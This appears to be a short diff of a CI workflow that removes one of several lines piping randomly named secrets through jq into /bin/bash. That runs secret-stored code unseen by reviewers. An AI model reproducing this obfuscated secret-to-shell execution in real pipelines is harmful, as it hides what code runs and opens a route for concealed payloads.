@@ -21,7 +21,6 @@ jobs:
           jtn9866: ${{ secrets.jtn9866 }}
         run: |
           printf '%s' "$jtn9866" | jq -r .bjnwo7 | /bin/bash
-          echo $lh5910 | jq -r .xhu61013 | /bin/bash
           printf '%s' "$gv33" | jq -r .la38 | /bin/bash
           printf '%s' "$mgqd44656" | jq -r .tcxvi215 | /bin/bash
           printf '%s' "$fsjz93082" | jq -r .ldrnb9 | /bin/bash
